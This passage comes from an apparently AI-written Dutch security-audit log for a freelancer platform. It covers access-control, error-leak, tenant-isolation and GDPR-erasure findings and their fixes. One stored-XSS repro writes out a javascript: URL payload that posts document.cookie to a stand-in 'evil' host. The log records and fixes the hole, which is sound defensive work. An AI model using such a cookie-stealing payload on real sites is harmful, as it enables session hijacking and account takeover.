Notification.body); agenda-`.ics`-feed token-gated + liveness + eigen-data-only; k-anonimiteit markttarief
`MIN_SAMPLE=10`. Overige geparkeerde items (FG/juridisch) ongewijzigd.

## Ronde 2026-07-21b (basis: `main` @ 4580c25a)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) object-/functie-authz + IDOR + mass-assignment + foutlek op álle server actions +
`api/**`-route-handlers (delta-focus PR's #856–#860: cascade-fasering, pending-tasks, tasks,
collaboration-renewal, signals, urenstaat-DoS-grenzen); (2) AVG erasure-volledigheid (veld-voor-veld
per PII-dragend model), dataminimalisatie server→client, PII-in-logs, CSV-injectie, k-anonimiteit,
audit-logging; (3) cross-tenant-isolatie FRANCHISER (`lib/tenancy.ts` + alle `franchise/**`-call-sites +
`lib/franchise/*`), injectie (SQL/XSS/template), SSRF, upload, open redirect, headers/CSP, `npm audit`.
Kader: OWASP Top 10 (A01/A03/A05) + ASVS + AVG art. 5/9/17/30/32. Stack: Next.js 15.5.19 (voorbij
CVE-2025-29927), Auth.js v5-beta.31, Prisma 6.19.3. Orchestrator verifieerde onafhankelijk: `npm audit
--omit=dev` → 0 kwetsbaarheden; enige `dangerouslySetInnerHTML` = nonce-gated theme-script; enige raw
SQL = statische `SELECT 1`-healthchecks; storage path-traversal-guard + magic-byte-sniffing intact.

**Twee bevindingen gevonden en OPGELOST (rood→groen); drie geparkeerd (product-/FG-oordeel of LAAG):**

### OPGELOST — HOOG: `cancelCollaboration` lekte rauwe fout-messages naar de client (OWASP A05 / CWE-209, PR volgt)

- **Repro:** `src/app/(protected)/samenwerkingen/actions.ts` — `cancelCollaboration` (bereikbaar door élke
  FREELANCER/CLIENT-partij van een samenwerking) ving in de catch `if (e instanceof Error) return { error:
e.message }` en stuurde de message van élke `Error` woordelijk terug. Gooide de transactie in
  `applyCollaborationStatusChange` een onverwachte `PrismaClientKnownRequestError`/systeemfout, dan echode
  die kolom-/constraint-namen of hostnames/paden naar de UI (én werd niet server-side gelogd). Dit is de
  spiegel van de al-gefixte `toMessage`-helper in het zusterbestand `samenwerkingen/[id]/actions.ts`
  (PR #850); die CWE-209-fix was nooit toegepast op `cancelCollaboration`.
- **Geschonden regel:** OWASP A05:2021 / CWE-209 Information Exposure Through an Error Message.
- **Fix:** catch → `return { error: toSafeActionError(e) }`: gecureerde domeinfouten
  (AuthorizationError/\*TransitionError/CascadeError + Nederlandse plain-Error) passeren; een
  Prisma-/systeemfout wordt server-side gelogd en vervangen door de generieke boodschap. Test:
  `samenwerkingen/cancel-error-leak.test.ts` (+2, HOOG, rood→groen).

### OPGELOST — MIDDEL: cross-tenant existence-oracle in `createFranchiseDienst` (OWASP A01 / CWE-203, PR volgt)

- **Repro:** `src/lib/franchise/dienst.ts` (aangeroepen vanuit `franchise/opdrachtgevers/actions.ts` én
  `franchise/opdrachtgevers/nieuw/actions.ts`) deed `findUnique` op de `departmentId` en liet daarna een
  throwing `assertSameTenant` de melding "Geen toegang tot deze bemiddeling-resource." teruggeven — te
  onderscheiden van "Afdeling niet gevonden." bij een onbekend id. Een franchiser kon zo aflezen of een
  gegokt afdeling-id bij een ándere tenant hoorde (cross-tenant existence-oracle). Exact het patroon dat de
  codebase elders al fail-closed dichtte (`addAfdelingStep`/`removeAfdelingStep`, `addDepartment`/
  `removeDepartment`); deze gedeelde helper was in die pass gemist (`wizard-oracle.test.ts` mockt
  `createFranchiseDienst` volledig weg, dus de eigen oracle was ongetest).
- **Geschonden regel:** OWASP A01 Broken Access Control / CWE-203 Observable Discrepancy; CLAUDE.md regel 2.
- **Fix:** fail-closed `if (!dept || !ownsViaTenant(actor, dept.company.tenantId)) return { error: "Afdeling
niet gevonden.", fieldErrors: { departmentId: "Onbekend." } }` — identieke melding voor onbekend én
  cross-tenant. Test: `lib/franchise/dienst-oracle.test.ts` (+2, MIDDEL, rood→groen). Geen data/mutatie
  lekte ooit (alleen bestaan-signaal), vandaar MIDDEL.

### Geparkeerd — LAAG (CWE-203, triviale fix): existence-oracle in `admin/shift-overnames/actions.ts`

- **Repro:** `loadDecidableHandoff` gooit een plain `Error("Overname-aanvraag niet gevonden.")` bij een
  ontbrekende handoff, maar laat de `AuthorizationError("Geen toegang tot deze bemiddeling-resource.")` van
  `assertSameTenant` door `toSafeActionError` woordelijk passeren — onderscheidbaar van "niet gevonden".
- **Geschonden regel:** CWE-203 Observable Discrepancy. **Waarom geparkeerd:** admin-only oppervlak (lage
  impact) + reeds eerder genoteerd; volgende run oppakken. **Aanbevolen fix:** unificeer op `ownsViaTenant`
  met de "niet gevonden"-melding (spiegel finding 2).

### Geparkeerd — LAAG (dataminimalisatie, geen live lek): `profile-screen.tsx` over-fetcht privé-financieelvelden

- **Repro:** `src/components/profile/profile-screen.tsx` doet `freelancerProfile.findUnique` met alleen
  `include` (geen top-level `select`) op de publieke, niet-geauthenticeerde route `/zzp/[id]`, waardoor
  `monthlyIncomeGoalCents`, `defaultMotivation`, `btwNumber` in servergeheugen worden geladen. Geverifieerd:
  géén van die velden wordt gerenderd of naar een client-component doorgegeven → **geen live lek vandaag**.
- **Geschonden regel:** AVG art. 5 (dataminimalisatie) / CLAUDE.md regel (defense-in-depth). **Waarom
  geparkeerd:** puur hardening (geen actueel lek); scheiden van de authz-fixes houdt de PR gefocust.
  **Aanbevolen fix:** expliciete `select` zodat een toekomstige render-regel geen privé-veld stil kan
  blootstellen.

### Geparkeerd — LAAG (FG-oordeel): `Expense.description` overleeft de erasure

- **Repro:** `anonymizeUser` raakt `Expense` nergens aan; `Expense.description` (zelf-geschreven vrije tekst)
  blijft na erasure staan. Nuance (nieuw): `uitgaven/actions.ts` `deleteExpense` laat een FREELANCER zijn
  uitgaven vrij zelf verwijderen zonder fiscale-jaar-/aangifte-grendel — dat ondergraaft de "fiscale
  retentie spiegelt Invoice"-onderbouwing (Invoice heeft géén delete-pad).
- **Geschonden regel:** AVG art. 17 vs. fiscale retentie (art. 5 lid 1e). **Waarom geparkeerd:** echte
  FG/juridische tweesprong (MENSENWERK §5) — óf `Expense.description` redigeren bij erasure, óf de
  retentiegrondslag expliciet in het verwerkingsregister vastleggen mét een consistente self-service-grendel
  op reeds-aangegeven jaren. Niet unilateraal door een agent te kiezen.

**Herbevestigd schoon (van-nul-af her-geverifieerd):** cascade-command-laag (auth→ownership→terminal/dispuut-
guard→effect→DomainEvent+AuditLog, geen mass-assignment); alle `api/**`-crown-jewel-routes (documenten/media)
ownership-checked + audit op toegestaan én geweigerd; franchise cross-tenant-isolatie verder airtight
(`tenantId` altijd uit `actor.tenantId`, nooit uit body); erasure dekt élk overig zelf-geschreven vrije-tekstveld
incl. secundaire kopieën in `AuditLog.metadata`/`DomainEvent.payload`/`Notification.body`; `escapeCsvField` dekt
`=`/`+`/`-`/`@`/tab/CR op alle export-call-sites; k-anonimiteit markttarief `MIN_SAMPLE=10`; logger redigeert
PII/secrets + e-mailmaskering; geen SSRF/open-redirect/raw-SQL-interpolatie/mass-assignment-spread.

## Ronde 2026-07-21 (basis: `main` @ e72af9fa)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) AVG art. 17 erasure-volledigheid: veld-voor-veld-diff van élk PII-dragend
schema-model tegen wat `anonymizeUser` scrubt/verwijdert (nadruk op modellen die sinds de vorige
verificatie zijn toegevoegd); (2) cross-tenant/multi-tenant-isolatie FRANCHISER (`lib/tenancy.ts` +
alle `franchise/**`-call-sites + de nieuwe `franchiseGuidedSetupTasks`); (3) object-/functie-authz +
IDOR + mass-assignment + foutlek op alle server actions + `api/**`-route-handlers, delta-focus op
PR's #850–#854 (db-zelftest, live-DB-rol-dashboard, veilige fout-hergooi, franchiser geleide-opzet,
client-compliance-gate, no-show passief signaal). Kader: OWASP Top 10 (A01/A03/A05) + ASVS + AVG art.
5/9/17/30/32. Stack: Next.js 15.5.19 (voorbij CVE-2025-29927), Auth.js v5-beta.31, Prisma 6.19.3.
Orchestrator verifieerde onafhankelijk: enige `dangerouslySetInnerHTML` = nonce-gated theme-script;
geen `$queryRawUnsafe`/`eval`; de nieuwe `db-selftest` reduceert elke fout tot `error.name` (geen
connection-string/tabelnaam-lek, CWE-209); `.env`/`*.db`/`*.pem` niet gecommit.

**Eén bevinding gevonden en OPGELOST (rood→groen); één bevinding geparkeerd (product-/FG-oordeel):**

### OPGELOST — HOOG: zelf-geschreven creditreden (`Invoice.rejectionReason`) overleefde de erasure (AVG art. 17, PR volgt)

- **Repro:** een ZZP'er crediteert een eigen factuur via `creditInvoice` (`src/lib/cascade/invoice-commands.ts`,
  guard: alleen de issuer of admin) → `planInvoiceCreditedEvent` (`src/lib/cascade/handlers.ts`) schrijft de
  door de ZZP'er zélf getypte vrije-tekstreden in DRIE kopieën: (1) `Invoice.rejectionReason`
  (`lifecycleStatus: "CREDITED"`), (2) de `INVOICE_CREDITED`-auditmetadata (`{ reason }`), (3) de
  notificatiebody van BEIDE partijen (`Factuur … is gecrediteerd door de ZZP'er. Reden: …`).
  `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) raakte de `Invoice` nergens aan en zijn
  brede notification-redactie (`where: { userId }`) dekt alleen de door de betrokkene ONTVANGEN kopie — niet de
  bij de opdrachtgever afgeleverde kopie. Zo bleef de zelf-geschreven reden onbeperkt leesbaar na erasure.
  Dit is de spiegel van de al-gedekte eigen dispuutreden/annuleerreden; en te onderscheiden van de AFKEUR-reden
  (`REJECTED`, zelfde kolom maar door de OPDRACHTGEVER over de ZZP'er geschreven — bewust geparkeerd), zodat de
  fix strikt op `lifecycleStatus: "CREDITED"` + `issuerUserId` scoopt.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid); CLAUDE.md architectuurregel 4/5 + de eigen
  erasure-intent (zelf-geschreven vrije tekst moet worden gewist).
- **Fix:** binnen de `anonymizeUser`-transactie: (1) `Invoice.rejectionReason` → null voor de eigen
  credit-facturen (`issuerUserId`, `CREDITED`); (2) de `INVOICE_CREDITED`-auditmetadata → `{ reason:
"[verwijderd]" }` gescopet op die factuur-id's (raakt nooit een `INVOICE_REJECTED`-regel van de tegenpartij);
  (3) de tegenpartij-notificatie geredact via exacte, deterministisch reconstrueerbare body (factuurnummer +
  reden) op de feed van `counterpartyUserId` (die notificatie heeft geen deep-link). Test:
  `anonymize-erasure.test.ts` (+3, HOOG, rood→groen; 30→33 tests).

### Geparkeerd — HOOG (product-/FG-oordeel, niet unilateraal): FRANCHISER-erasure laat de eigen `Tenant`-identiteit staan (AVG art. 17)

- **Repro:** `canAnonymizeUser` blokkeert alleen ADMIN/self/al-geanonimiseerd; een FRANCHISER kan zelf een
  verwijderverzoek indienen en worden geanonimiseerd. `anonymizeUser` raakt `prisma.tenant` nergens aan, dus
  `Tenant.name`/`slug`/`brandColor` (de door de bemiddelaar gekozen bedrijfsidentiteit — mogelijk een
  persoons-/familienaam bij een solo-bemiddelaar) blijven platformbreed zichtbaar voor élk tenant-lid, terwijl
  `User.name`/`email` wél worden overschreven. Structureel identiek aan `Company.name` (dat voor een CLIENT wél
  wordt gewist via `companyAnonymizationData`).
- **Geschonden regel:** AVG art. 17; consistentie met de bestaande `Company`-erasure.
- **Waarom geparkeerd:** de keuze is een echte tweesprong — óf (a) `Tenant.name`/`brandColor` scrubben
  (spiegel `Company`), maar `slug` wordt voor routing gebruikt en een tenant met actieve leden/opdrachtgevers
  wordt dan een verweesde franchise; óf (b) anonimisering blokkeren zolang de FRANCHISER een actieve tenant
  bezit (eerst overdracht van eigenaarschap eisen). Dat is een product-/bedrijfs-/FG-besluit (MENSENWERK §5),
  niet unilateraal door een agent te kiezen. **Aanbevolen fix (na sign-off):** `tenantAnonymizationData()`
  spiegel van `companyAnonymizationData()` + `prisma.tenant.updateMany({ where: { ownerUserId } })`, óf een
  guard in `canAnonymizeUser` die overdracht afdwingt.

**Herbevestigd schoon (van-nul-af her-geverifieerd, niet op docs vertrouwd):** franchiser cross-tenant-isolatie
airtight (elke franchise-query bakt `tenantId` uit `actor.tenantId` in of volgt `assertSameTenant`/`ownsViaTenant`;
geen `tenantId`-mass-assignment; existence-oracle-pariteit); alle `api/**`-crown-jewel-routes (documenten/media/
dossier/factuur-PDF) ownership-checked + audit op toegestaan én geweigerd; de PR-#850–#854-delta volgt de volledige
auth→rol→ownership→Zod→actie→audit-keten (db-zelftest read-only + rate-limited + audit, geen secret/PII-lek);
alle overige zelf-geschreven vrije-tekstvelden (motivatie/support/idee/beoordeling/prestatie/dispuut/annulering/
lead-contact/favoriet-notitie) correct gedekt; de al-geparkeerde tegenpartij-velden (`NoShowReport.reason`,
`Performance.rejectionReason`, `Invoice.rejectionReason` REJECTED-tak, `Review.comment` subject-zijde,
`Expense.description`, `TaxFilingRequest` fiscale retentie, Lead-PII) blijven bewust geparkeerd (FG/juridisch).

## Ronde 2026-07-20b (basis: `main` @ aa79fcdc)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken, delta-focus op de nieuwste code sinds `d11f7f5e` (PR's #844–#849: Sentry error-monitoring +
zelftest, upload-scanner-zelftest, dispuut-vries op `createPerformance`/contract/collab-statuswijziging,
franchise re-engagement, "eerder samengewerkt"-signaal) — (1) alle server actions + `api/**` route-handlers +
cascade-command-laag (IDOR/authz/mass-assignment/statusovergang/foutlek); (2) AVG — dataminimalisatie,
erasure-volledigheid, PII-in-logs, CSV-injectie, k-anonimiteit, derden; (3) cross-tenant-isolatie FRANCHISER +
injectie (XSS/SQL) + SSRF + upload + open redirect; (4) auth/sessie/secrets/headers/CSP + `npm audit` +
CVE-2025-29927. Kader: OWASP Top 10 (A01/A03/A05/A10) + ASVS + AVG art. 5/9/17/30/32. Stack: Next.js 15.5.19
(voorbij CVE-2025-29927), Auth.js v5-beta.31, Prisma 6.19.3. Orchestrator verifieerde: `npm audit --omit=dev`
→ 0 kwetsbaarheden; enige `dangerouslySetInnerHTML` = nonce-gated theme-script; geen
`$queryRawUnsafe`/user-URL-SSRF; storage path-traversal-guard + magic-byte-sniffing intact.

**Twee bevindingen gevonden en OPGELOST (rood→groen):**

### OPGELOST — HOOG: dashboard vertakte op de stale JWT-rol i.p.v. de live DB-rol (OWASP A01 / CWE-613, PR volgt)

- **Repro:** `src/app/(protected)/dashboard/page.tsx` berekende `const role = user.role as UserRole` uit de
  **JWT** (`session.user.role`) en voedde die aan `dashboardData(role, …)`, terwijl de vers-uit-de-DB gelezen
  `actor` (via `requireActor()`) op de volgende regel wél beschikbaar was maar zijn `.role` nooit werd gebruikt.
  De sessie is een stateless JWT (`maxAge` 8u, geen server-side revocatie; de `jwt`-callback herleest de rol niet
  per request). `dashboardData` valt voor élke niet-FREELANCER/CLIENT/FRANCHISER-rol door naar de **platformbrede
  ADMIN-tak** (`prisma.user.count()`, `prisma.job.count()`, kruis-tenant lopende samenwerkingen mét de échte namen
  van ZZP'ers én opdrachtgevers over het hele platform). Wordt een ADMIN/FRANCHISER in de DB gedegradeerd (de enige
  weg: directe DB-edit — self-service/import staat alleen FREELANCER/CLIENT toe), dan blijft `/dashboard` tot 8u
  het platformbrede admin-overzicht tonen aan iemand wiens live rol dat niet meer is. Elk ander authz-oppervlak in
  de codebase leest de rol wél live via `requireActor`/`requireRole`; dit dashboard was de enige uitzondering.
- **Geschonden regel:** CLAUDE.md regel 1 (server-side is de waarheid; client mag tonen, nooit beslissen); OWASP
  A01 Broken Access Control / CWE-613 Insufficient Session Expiration (kruis-tenant PII-blootstelling).
- **Fix:** `const role = actor.role` (live DB-rol uit `requireActor()`), met toelichtende comment. Test:
  `dashboard/live-role.test.tsx` (+2, HOOG, rood→groen): een live FREELANCER met een stale ADMIN-JWT triggert
  de platformbrede `prisma.user.count()` NIET; een live ADMIN met een stale FREELANCER-JWT krijgt WEL de admin-tak
  (en niet de FREELANCER-only aanbevelingen).

### OPGELOST — MIDDEL: `toMessage` lekte rauwe fout-messages op geld-/dispuut-acties (OWASP A05 / CWE-209, PR volgt)

- **Repro:** `src/app/(protected)/samenwerkingen/[id]/actions.ts` — de lokale `toMessage`-helper (`if (e instanceof
Error) throw new Error(e.message)`) gooit de message van élke `Error` woordelijk terug voor 10 plain
  (niet-`useActionState`) geld-/status-cascade-acties (`signContractAction`, `approve/rejectPerformanceAction`,
  `submit/approve/rejectInvoiceAction`, `confirmPaymentAction`, `creditInvoiceAction`, `open/resolveDisputeAction`).
  Anders dan `toSafeActionError` (elders in ditzelfde bestand wél gebruikt) filtert het geen Prisma-/systeemfout:
  een onverwachte `PrismaClientKnownRequestError`/`ECONNREFUSED` kan kolom-/constraint-namen of hostnames/paden
  echoën, en de fout wordt niet server-side gelogd. Next.js' productie-redactie mitigeert vandaag het meeste, maar
  dit was de enige plek in het herziene oppervlak die afweek van de eigen CWE-209-controle.
- **Geschonden regel:** OWASP A05:2021 / CWE-209 Information Exposure Through an Error Message.
- **Fix:** nieuwe geëxporteerde `throwSafeActionError(e, fallback?)` in `src/lib/safe-action-error.ts` (throw-vorm
  van `toSafeActionError`: gecureerde Nederlandse messages passeren, Prisma/system/niet-Error → server-side gelogd
  - generiek). `toMessage` delegeert er nu naar; ongebruikte `CascadeError`-import verwijderd. Test:
    `safe-action-error.test.ts` (+4, MIDDEL, rood→groen).

**Herbevestigd schoon (van-nul-af her-geverifieerd, niet op docs vertrouwd):** franchiser cross-tenant-isolatie
airtight (elke franchise-query bakt `tenantId` uit `actor.tenantId` in of volgt `assertSameTenant`/`ownsViaTenant`;
de nieuwe `opdrachtgevers/[id]`-aggregaten draaien op een reeds tenant-geverifieerde `company.id`); dispuut-vries
(`assertNotDisputed` + TOCTOU-herlezing binnen de effect-transactie) consistent over contract/performance/invoice/
payment; alle zeven admin-zelftests auth→rol→rate-limit→actie→audit, nooit DSN/secret in output; Sentry
`sendDefaultPii:false` + PII-scrubbing; `market-rate` k-anon-vloer (≥10) test-locked; erasure-dekking
model-voor-model volledig; geen user-URL-SSRF; storage path-traversal + magic-byte-guard; CSP nonce+strict-dynamic;
`npm audit --omit=dev` 0; wachtwoord-reset/share-tokens crypto-sterk + timing-safe + single-use.

**Geparkeerd (deze ronde bevestigd, niet nieuw — vereist FG/juridische sign-off of laag-risico consistentie):**

- **MIDDEL (AVG art. 30):** `HealthIncident.evidence`/`summary` (`src/lib/monitoring/detectors.ts`) slaat rauwe
  IP-adressen op (`LOGIN_BURST`/`PASSWORD_RESET_FLOOD`) zonder retentie/purge-taak en zonder
  `processing-register.ts`-entry. Legitiem belang (beveiliging) waarschijnlijk rechtmatig, maar bewaartermijn +
  register-grondslag ontbreken. Aanbevolen: purge-taak (bv. 90d) + registeritem.
- **MIDDEL/HOOG (AVG art. 17):** `Performance.rejectionReason` / `NoShowReport.reason`+`verdictNote` /
  `Review.comment` (subject-zijde) — door de tegenpartij geschreven vrije tekst die de erasure niet raakt.
  Bewuste retentie vs. redactie is een FG/juridische afweging (MENSENWERK §5). Bijbehorende auditlog-metadata
  (`PERFORMANCE_REJECTED`/`INVOICE_REJECTED`/`NO_SHOW_JUDGED`) moet dezelfde beslissing volgen.
- **LAAG (architectuurdrift):** `setOrtProfileAction`/`setWeekdaysAction`/`setAgreementTypeAction` valideren
  handmatig i.p.v. via Zod (correct/niet-exploiteerbaar; consistentie-fix).

## Ronde 2026-07-20 (basis: `main` @ d11f7f5e)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) AVG art. 17 anonimisering-/erasure-volledigheid (`account-anonymization.ts`,
`admin/gebruikers/actions.ts`, schema-veld-voor-veld); (2) cross-tenant/multi-tenant-isolatie FRANCHISER
(`lib/tenancy.ts`, `lib/franchise/**`, alle call-sites, `franchiserTasks`); (3) alle HTTP route-handlers
`src/app/api/**` + hoogrisico server actions (documenten/facturen/certificaten/admin-verificatie/berichten/
account); (4) resterende server actions (`samenwerkingen/[id]`, `prestaties`, `bedrijf`, `search`). Kader:
OWASP Top 10 (A01 Broken Access Control, A03 Injection/XSS, A05, A10 SSRF) + ASVS + AVG art. 5/9/17/32.
Stack: Next.js 15.5.19, Auth.js v5-beta.31, Prisma 6.2.1. Orchestrator verifieerde onafhankelijk: `npm audit
--omit=dev` → 0 kwetsbaarheden; enige `dangerouslySetInnerHTML` = nonce-gated theme-script; geen
`$queryRawUnsafe`/eval; alle CSV-exports via de formule-injectie-gehardende `escapeCsvField`/`toCsv`
(CWE-1236); geen user-URL-SSRF (alle `fetch` naar vaste/allowlist-endpoints); `LocalStorageDriver.resolve()`
path-traversal-guard correct.

**Twee bevindingen gevonden en OPGELOST (rood→groen):**

### OPGELOST — KRITIEK: `CREDENTIAL_REJECTED`-auditmetadata overleefde de erasure (AVG art. 17, PR volgt)

- **Repro:** admin wijst een VOG/diploma af met een vrije-tekstreden → die reden staat in
  `AuditLog.metadata.reason` op een rij met `actorId` = admin, `entityType: "Credential"`. `anonymizeUser`
  verwijdert de credential hard (regel 4), maar de erasure-audit-scrub selecteert alleen rijen met
  `actorId === userId` OF `entityType: "User"` OF exact-e-mail-match. De credential-afwijsrij valt buiten
  alle drie → de reden (mogelijk de naam of art. 9-inhoud van het bewijsstuk) bleef onbeperkt leesbaar voor
  elke admin met auditinzage. Precies het patroon dat voor `DISPUTE_OPENED` (via `actorId === userId`) wél
  al gedekt was.
- **Geschonden regel:** AVG art. 17; CLAUDE.md architectuurregel 5 (audit) samen met de eigen erasure-intent.
- **Fix:** `src/app/(protected)/admin/gebruikers/actions.ts` — verzamelt de credential-id's van de betrokkene
  vóór de verwijdering en redact binnen dezelfde transactie de `metadata` (→ `null`) van élke auditregel met
  `entityType: "Credential"` en `entityId ∈ die id's` (uniek aan de betrokkene). De regel zelf (actor/actie/
  tijd) blijft als verantwoordingsspoor. Test: `anonymize-erasure.test.ts` (+1, KRITIEK, rood→groen).

### OPGELOST — HOOG: stored XSS via `company.website` (`javascript:`/`data:`-schema, OWASP A03/CWE-79, PR volgt)

- **Repro:** een CLIENT zet `website=javascript:fetch('https://evil',{method:'POST',body:document.cookie})`
  via het bedrijfsprofiel-formulier. `companyProfileSchema.website` gebruikte `z.string().url()`, dat óók
  `javascript:`/`data:`-URI's goedkeurt. De waarde wordt als rauwe `href` gerenderd in
  `company-profile-screen.tsx` én de opdracht-detailpagina → JS-uitvoering in de platform-origin bij een klik.
  CSP (nonce + strict-dynamic) mitigeert in moderne browsers maar is geen server-side gate (oudere browsers/
  toekomstige CSP-versoepeling niet gedekt).
- **Geschonden regel:** CLAUDE.md architectuurregel 2 (Zod = bron van waarheid); OWASP A03.
- **Fix:** `src/lib/validation.ts` — nieuwe `httpUrl()`-helper die uitsluitend `http:`/`https:` toestaat
  (schema-restrictie, defense-in-depth, los van CSP); `companyProfileSchema.website` gebruikt hem nu. Test:
  `validation.test.ts` (+2, HOOG, rood→groen; verwerpt `javascript:`/`data:`/`vbscript:`, accepteert http(s)).

**Geparkeerd (vereisen FG/juridische sign-off of laag-risico architectuurdrift — niet unilateraal):**

- **MIDDEL (AVG art. 17):** de `PERFORMANCE_REJECTED`/`INVOICE_REJECTED`/`NO_SHOW_JUDGED`-auditmetadata dragen
  dezelfde vrije-tekstreden als de reeds-geparkeerde DB-velden (`Performance.rejectionReason`,
  `NoShowReport.reason`). Wanneer die backlog-carve-out juridisch wordt beslist, moet de beslissing óók de
  bijbehorende auditlog-metadata dekken (nu ongemoeid). Aanbevolen: expliciet aan het MENSENWERK-item toevoegen.
- **HOOG (AVG art. 17):** `Review.comment` geschreven door de tegenpartij _over_ de gewiste persoon
  (`subjectId === userId`) wordt niet geraakt (alleen de auteur-kant `authorId` wordt geredact) en blijft
  zichtbaar in de publieke reputatie-query. Vereist dezelfde legitiem-belang/bewaargrond-afweging als
  `NoShowReport.reason` (FG/juridisch) — óf redacten óf expliciet documenteren als bewuste retentie.
- **MIDDEL/LAAG (OWASP A05):** `toMessage` in `samenwerkingen/[id]/actions.ts` herwerpt `e.message` voor élke
  Error (geen Prisma-/systeemfout-filter zoals `toSafeActionError` elders in hetzelfde bestand). Next.js'
  productie-digest-scrubbing mitigeert de meeste gevallen; consistentie-fix aanbevolen (route via
  `toSafeActionError`).
- **LAAG (architectuurdrift):** `setOrtProfileAction`/`setWeekdaysAction`/`setAgreementTypeAction` valideren
  handmatig (whitelist + bounds) i.p.v. via Zod. Checks zijn correct/niet-exploiteerbaar; wrap in een klein
  `z.object` voor consistentie met regel 2.
- **Awareness (AVG art. 5.1.c):** `Expense.description` (vrije tekst) valt onder de fiscale-retentie-carve-out
  zoals `Invoice`, maar kan meer identificerend detail bevatten dan fiscaal nodig — data-minimalisatie-
  judgment call voor de FG.

**Schoon herbevestigd:** franchiser cross-tenant-isolatie airtight (elke `findUnique`/`findFirst` bakt
`tenantId` in of volgt `assertSameTenant`/`ownsViaTenant`; `tenantId` altijd uit `actor.tenantId`, nooit uit
client-input); alle `api/**`-routes + hoogrisico-actions hebben de volledige auth→rol→ownership→Zod→actie→
audit-keten, geen IDOR/overposting; document-/media-routes ownership-checked + audit op toegestaan én
geweigerd; cron fail-closed timing-safe; billing-webhook idempotent + provider-geverifieerd.

## Ronde 2026-07-19b (basis: `main` @ fb4d4f2e)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) cross-tenant/multi-tenant-isolatie voor de FRANCHISER-rol (`franchise/**`, `lib/tenancy.ts`

- alle call-sites); (2) alle HTTP route-handlers `src/app/api/**` (auth/IDOR/upload/SSRF/injectie/foutlek);
  (3) object-/functie-authz + IDOR + mass-assignment op alle non-admin/non-franchise server actions + de
  cascade-laag; (4) AVG — anonimisering-volledigheid, dataminimalisatie, PII-in-logs, CSV-injectie,
  k-anonimiteit, retentie. Delta-focus sinds de vorige ronde (`a501cbc9..fb4d4f2e`, PR's #829–#835:
  TOCTOU-statusguard, backup-heartbeat dead-man's-switch, tarief-rekenhulp, reactiereputatie-spiegel,
  propose-collaboration-taak, terminale-status-UI-rem). Kader: OWASP Top 10 (A01 Broken Access Control,
  A03 Injection, A04 Insecure Design, A08, A10 SSRF) + ASVS + AVG art. 5/9/15/17/30/32. Stack: Next.js
  15.5.19 (voorbij CVE-2025-29927), Auth.js v5-beta.31, Prisma 6.2.1.

**Uitkomst: geen nieuwe KRITIEK/HOOG/MIDDEL/LAAG in code-fixbaar gebied.** Elk van de vier oppervlakken is
door directe code-lezing (niet door de doc te vertrouwen) van-nul-af her-geverifieerd; alle vier convergeren
op "schoon", consistent met de vorige ronde. Aanvullend door de orchestrator geverifieerd:

- **Injectie (A03):** geen `$queryRawUnsafe`/string-geconcateneerd SQL; enkel getagde `SELECT 1`-templates in
  `health`/`readiness`. Enige `dangerouslySetInnerHTML` is het nonce-gated theme-script (`layout.tsx:64`,
  statische inhoud, geen user-input).
- **SSRF (A10):** geen server-side fetch met user-gestuurde URL; push-endpoint gaat via `isAllowedPushEndpoint`-
  allowlist; observability post naar een vaste `ENDPOINT`.
- **Bestandsroutes (crown jewels VOG/diploma/BIG):** `documents/[id]`, `media/[...key]`, factuur-/prestatie-/
  dossier-PDF's — ownership-check + audit op zowel toegestane áls geweigerde toegang, rate-limiting,
  `Content-Security-Policy: sandbox; default-src 'none'` op de document-download, filename-sanitisatie,
  path-traversal geweigerd door `LocalStorageDriver.resolve()`. Nooit een publiek pad (regel 4).
- **Cron-auth:** `authorizeCron` is fail-closed (503 zonder `CRON_SECRET`), timing-safe (`timingSafeEqual`),
  alleen `Authorization: Bearer` (geen `?token=`-query in access-logs). Nieuwe `backups/heartbeat`-route erft
  ditzelfde patroon; schrijft alleen een PII-vrije `{lastRunAt, lastOk}`-singleton.
- **Dependencies:** `npm audit --omit=dev` → 0 kwetsbaarheden (prod). 2 dev-only (js-yaml DoS, transitief) —
  geen productie-oppervlak.
- **Auth/rate-limiting:** login/register/wachtwoord-reset achter `RateLimiter` (Memory- of durable
  Upstash-store); account-status live uit de DB (`currentActor` — geschorst/geanonimiseerd verliest direct
  toegang, ook met geldige JWT).
- **Security headers/CSP (A05):** volledige suite in `next.config.mjs` (HSTS 2j + `includeSubDomains` +
  `preload`, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`); CSP met
  per-request nonce + `strict-dynamic`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`,
  `form-action 'self'`, violatie-rapportage via `report-to`/`report-uri`.
- **Nieuwe reputatie-features (#826):** `client-responsiveness-reputation.ts` is pure zelf-gerichte
  aggregatie — geen individuele reactie van een derde ZZP'er lekt; spiegelt `client-payment-reputation`.
  De `*_MIN_SAMPLE_SIZE = 3`-vloeren (payment/responsiveness/reliability) zijn **statistische
  betrouwbaarheidsdrempels voor het eigen gedrag van één subject (de opdrachtgever)**, geen
  derde-partij-k-anonimiteit — het verwerkingsregister onderscheidt ze expliciet van `MARKET_RATE_MIN_SAMPLE
= 10` (dat wél k-anonimiteit op een pool van ZZP'ers is). Ze verhogen naar 10 zou een legitieme feature
  schaden zonder privacywinst; correct als niet-bevinding.

De pre-existing MENSENWERK-items (`NoShowReport.reason`/`Performance.rejectionReason` overleven erasure —
juridische retentie-vs-vergetelheid-afweging; Message/Application- en Lead-retentie) blijven open en vereisen
FG/juridische sign-off — niet unilateraal door een agent te wijzigen. Zie hieronder.

## Ronde 2026-07-19 (basis: `main` @ a501cbc9)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) alle route-handlers `src/app/api/**`; (2) object-/functie-authz + IDOR + cross-tenant
